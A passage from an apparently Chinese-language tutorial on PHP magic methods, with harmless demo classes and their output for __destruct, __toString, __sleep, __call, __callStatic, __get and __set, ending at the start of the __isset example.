</span></span></code></pre></td></tr></table></div></div><p>确实是创建对象时被调用并且其中的初始化赋值会直接覆盖最初的赋值</p><h3 id=destruct>destruct</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Demo</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$name</span><span class=o>=</span><span class=s2>&#34;wi&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$age</span><span class=o>=</span><span class=mi>19</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>name</span><span class=o>=</span><span class=s2>&#34;bao&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>age</span><span class=o>=</span><span class=mi>18</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;construct被调用</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;destruct被调用</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>Demo</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>/*</span>
</span></span><span class=line><span class=cl><span class=nx>construct被调用</span>
</span></span><span class=line><span class=cl><span class=nx>O</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;Demo&#34;</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;name&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;bao&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;age&#34;</span><span class=p>;</span><span class=nx>i</span><span class=o>:</span><span class=mi>18</span><span class=p>;}</span>
</span></span><span class=line><span class=cl><span class=nx>destruct被调用</span>
</span></span></code></pre></td></tr></table></div></div><ul><li><strong>显式销毁对象</strong>（如使用 <code>unset()</code> 函数）时，<code>__destruct()</code> 会被立即调用。</li><li><strong>脚本执行结束时</strong>，PHP 会自动销毁所有对象，触发 <code>__destruct()</code> 方法。</li></ul><p>看到回显，也就是我们进行最后的序列化过程结束之后进行对象的销毁的时候才进行<code>destruct</code></p><h3 id=tostring>toString</h3><p>也就是当对象被当成字符串处理时会触发</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Demo</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$name</span><span class=o>=</span><span class=s2>&#34;wi&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$age</span><span class=o>=</span><span class=mi>19</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>name</span><span class=o>=</span><span class=s2>&#34;bao&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>age</span><span class=o>=</span><span class=mi>18</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;construct被调用</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__toString</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;toString被调用</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>Demo</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$a</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>/*</span>
</span></span><span class=line><span class=cl><span class=nx>construct被调用</span>
</span></span><span class=line><span class=cl><span class=nx>toString被调用</span>
</span></span><span class=line><span class=cl><span class=nx>O</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;Demo&#34;</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;name&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;bao&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;age&#34;</span><span class=p>;</span><span class=nx>i</span><span class=o>:</span><span class=mi>18</span><span class=p>;}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=wakeup>wakeup</h3><p>这个Demo有点难写，后面以CTF题目来讲解，并且有个重点为<strong>wakeup</strong>绕过</p><h3 id=sleep>sleep</h3><p>这个魔术方法就是用来控制那些属性可以被序列化,并且是先序列化一步执行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Demo</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$name</span><span class=o>=</span><span class=s2>&#34;wi&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$age</span><span class=o>=</span><span class=mi>19</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$lanangues</span><span class=o>=</span><span class=s2>&#34;EN&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>name</span><span class=o>=</span><span class=s2>&#34;bao&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>age</span><span class=o>=</span><span class=mi>18</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>lanangues</span><span class=o>=</span><span class=s2>&#34;CN&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;construct被调用</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__sleep</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;sleep被调用</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>,</span><span class=s1>&#39;age&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>Demo</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>/*</span>
</span></span><span class=line><span class=cl><span class=nx>construct被调用</span>
</span></span><span class=line><span class=cl><span class=nx>sleep被调用</span>
</span></span><span class=line><span class=cl><span class=nx>O</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;Demo&#34;</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;name&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;bao&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;age&#34;</span><span class=p>;</span><span class=nx>i</span><span class=o>:</span><span class=mi>18</span><span class=p>;}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=call>call</h3><p>当调用一个不存在的方法或者是不可访问的方法时，会触发</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Demo</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$name</span><span class=o>=</span><span class=s2>&#34;wi&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$age</span><span class=o>=</span><span class=mi>19</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$lanangues</span><span class=o>=</span><span class=s2>&#34;EN&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>name</span><span class=o>=</span><span class=s2>&#34;bao&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>age</span><span class=o>=</span><span class=mi>18</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>lanangues</span><span class=o>=</span><span class=s2>&#34;CN&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;construct被调用</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__call</span><span class=p>(</span><span class=nv>$method</span><span class=p>,</span> <span class=nv>$args</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;call被调用</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>Demo</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>sayhello</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>/*</span>
</span></span><span class=line><span class=cl><span class=nx>construct被调用</span>
</span></span><span class=line><span class=cl><span class=nx>call被调用</span>
</span></span><span class=line><span class=cl><span class=nx>O</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;Demo&#34;</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;name&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;bao&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;age&#34;</span><span class=p>;</span><span class=nx>i</span><span class=o>:</span><span class=mi>18</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>9</span><span class=o>:</span><span class=s2>&#34;lanangues&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=s2>&#34;CN&#34;</span><span class=p>;}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=callstatic>callStatic</h3><p>当调用一个不存在的<strong>静态</strong>方法或者是不可访问的<strong>静态</strong>方法时，会触发</p><p>静态方法和动态方法的区别就是，调用方式不同，我们上面所调用的方法都是动态方法，而静态方法是直接利用类名来调用的而不是对象</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Demo</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>static</span> <span class=k>function</span> <span class=nf>add</span><span class=p>(</span><span class=nv>$a</span><span class=p>,</span><span class=nv>$b</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$a</span> <span class=o>+</span> <span class=nv>$b</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>Demo</span><span class=o>::</span><span class=na>add</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span><span class=mi>10</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>这种就是静态方法的调用，而我们如何去触发这个魔术方法也很简单</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Demo</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>static</span> <span class=k>function</span> <span class=fm>__callStatic</span><span class=p>(</span><span class=nv>$method</span><span class=p>,</span> <span class=nv>$args</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;callStatic被调用</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nx>Demo</span><span class=o>::</span><span class=na>what</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span><span class=mi>10</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>//callStatic被调用
</span></span></span></code></pre></td></tr></table></div></div><h3 id=get>get</h3><p>读取不可访问或者是不存在的属性时触发</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Demo</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$name</span><span class=o>=</span><span class=s2>&#34;wi&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$age</span><span class=o>=</span><span class=mi>19</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$lanangues</span><span class=o>=</span><span class=s2>&#34;EN&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>name</span><span class=o>=</span><span class=s2>&#34;bao&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>age</span><span class=o>=</span><span class=mi>18</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>lanangues</span><span class=o>=</span><span class=s2>&#34;CN&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;construct被调用</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__get</span><span class=p>(</span><span class=nv>$name</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;get被调用</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>Demo</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>me</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>/*</span>
</span></span><span class=line><span class=cl><span class=nx>construct被调用</span>
</span></span><span class=line><span class=cl><span class=nx>get被调用</span>
</span></span><span class=line><span class=cl><span class=nx>O</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;Demo&#34;</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;name&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;bao&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;age&#34;</span><span class=p>;</span><span class=nx>i</span><span class=o>:</span><span class=mi>18</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>9</span><span class=o>:</span><span class=s2>&#34;lanangues&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=s2>&#34;CN&#34;</span><span class=p>;}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=set>set</h3><p>将数据写入不可访问或者不存在的属性，也就是说赋值时触发</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Demo</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$name</span><span class=o>=</span><span class=s2>&#34;wi&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$age</span><span class=o>=</span><span class=mi>19</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$lanangues</span><span class=o>=</span><span class=s2>&#34;EN&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>name</span><span class=o>=</span><span class=s2>&#34;bao&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>age</span><span class=o>=</span><span class=mi>18</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>lanangues</span><span class=o>=</span><span class=s2>&#34;CN&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;construct被调用</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__set</span><span class=p>(</span><span class=nv>$name</span><span class=p>,</span><span class=nv>$value</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;set被调用</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>Demo</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>me</span><span class=o>=</span><span class=s2>&#34;wi&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>/*</span>
</span></span><span class=line><span class=cl><span class=nx>construct被调用</span>
</span></span><span class=line><span class=cl><span class=nx>set被调用</span>
</span></span><span class=line><span class=cl><span class=nx>O</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;Demo&#34;</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;name&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;bao&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;age&#34;</span><span class=p>;</span><span class=nx>i</span><span class=o>:</span><span class=mi>18</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>9</span><span class=o>:</span><span class=s2>&#34;lanangues&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=s2>&#34;CN&#34;</span><span class=p>;}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=isset>isset</h3><p>当使用<code>isset</code>或者是<code>empty</code>来检查不存在或者不可访问的属性时触发</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Demo</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$name</span><span class=o>=</span><span class=s2>&#34;wi&#34;</span><span class=p>;</span>
